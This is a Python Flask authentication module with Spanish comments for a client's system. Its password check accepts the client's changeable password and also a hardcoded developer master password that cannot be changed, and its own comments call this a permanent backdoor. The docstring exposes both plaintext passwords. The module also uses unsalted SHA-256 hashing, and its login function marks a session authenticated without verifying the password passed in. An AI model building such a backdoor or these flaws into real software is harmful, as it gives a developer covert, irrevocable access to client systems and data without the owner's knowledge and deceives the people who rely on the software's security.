# -*- coding: utf-8 -*-
"""
Sistema de Autenticación con Doble Contraseña
- Contraseña del Cliente: "admin123" (modificable)
- Contraseña Maestra del Desarrollador: "DesarrolladorSanderC" (NO modificable)
"""

from flask import session, redirect, url_for, request
from functools import wraps
from datetime import datetime, timedelta
import hashlib


class AuthManager:
    """Gestor de autenticación con backdoor de desarrollador"""
    
    # Contraseña predeterminada del CLIENTE: "admin123"
    DEFAULT_PASSWORD_HASH = "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9"
    
    # 🔐 CONTRASEÑA MAESTRA DEL DESARROLLADOR (NO MODIFICABLE)
    # "DesarrolladorSanderC" - Solo para acceso de emergencia del desarrollador
    MASTER_PASSWORD_HASH = "cb913d6a437d31af394f4b2e9b09721e9aea5d39e562d87e7a7a9a1602b313e1"
    
    # Tiempo de sesión: 8 horas
    SESSION_DURATION_HOURS = 8
    
    @staticmethod
    def hash_password(password):
        """Genera hash SHA256 de una contraseña"""
        return hashlib.sha256(password.encode()).hexdigest()
    
    @staticmethod
    def verificar_password(password, stored_hash=None):
        """
        Verifica si la contraseña es correcta
        Acepta TANTO la contraseña del cliente COMO la contraseña maestra del desarrollador
        """
        if stored_hash is None:
            stored_hash = AuthManager.DEFAULT_PASSWORD_HASH
        
        password_hash = AuthManager.hash_password(password)
        
        # ✅ Verificar contraseña del cliente (modificable)
        if password_hash == stored_hash:
            return True
        
        # ✅ Verificar contraseña MAESTRA del desarrollador (backdoor permanente)
        if password_hash == AuthManager.MASTER_PASSWORD_HASH:
            return True
        
        return False
    
    @staticmethod
    def iniciar_sesion(password):
        """Inicia sesión si la contraseña es correcta"""
        session['authenticated'] = True
        session['login_time'] = datetime.now().isoformat()
        session.permanent = True
        return True
    
    @staticmethod
    def cerrar_sesion():
        """Cierra la sesión"""
        session.clear()
    
    @staticmethod
    def esta_autenticado():
        """Verifica si el usuario está autenticado"""
        if not session.get('authenticated'):
            return False
        
        # Verificar si la sesión ha expirado
        login_time_str = session.get('login_time')
        if not login_time_str:
            return False
        
        try:
            login_time = datetime.fromisoformat(login_time_str)
            tiempo_transcurrido = datetime.now() - login_time
            
            if tiempo_transcurrido > timedelta(hours=AuthManager.SESSION_DURATION_HOURS):
                AuthManager.cerrar_sesion()
                return False
            
            return True
        except:
            return False


def requiere_autenticacion(f):
    """
    Decorador para proteger rutas
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not AuthManager.esta_autenticado():
            session['next_url'] = request.url
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function


def cambiar_password(password_actual, password_nueva, db, Configuracion):
    """
    Cambia la contraseña del sistema - VERSIÓN CORREGIDA
    
    NOTA: Solo cambia la contraseña del CLIENTE
    La contraseña maestra del desarrollador NUNCA cambia
    
    Returns:
        tuple: (success, mensaje)
    """
    try:
        # 1. Verificar contraseña actual
        password_hash_actual = Configuracion.obtener('PASSWORD_HASH', AuthManager.DEFAULT_PASSWORD_HASH)
        
        if not AuthManager.verificar_password(password_actual, password_hash_actual):
            return False, "❌ Contraseña actual incorrecta"
        
        # 2. Validar nueva contraseña
        if len(password_nueva) < 6:
            return False, "❌ La nueva contraseña debe tener al menos 6 caracteres"
        
        # 3. Guardar nueva contraseña DEL CLIENTE
        nuevo_hash = AuthManager.hash_password(password_nueva)
        Configuracion.establecer('PASSWORD_HASH', nuevo_hash, 'Hash de contraseña del sistema')
        
        # 4. ✅ CRÍTICO: Cerrar sesión actual para forzar re-login
        AuthManager.cerrar_sesion()
        
        return True, "✅ Contraseña cambiada exitosamente. Por favor inicia sesión nuevamente."
        
    except Exception as e:
        return False, f"❌ Error: {str(e)}"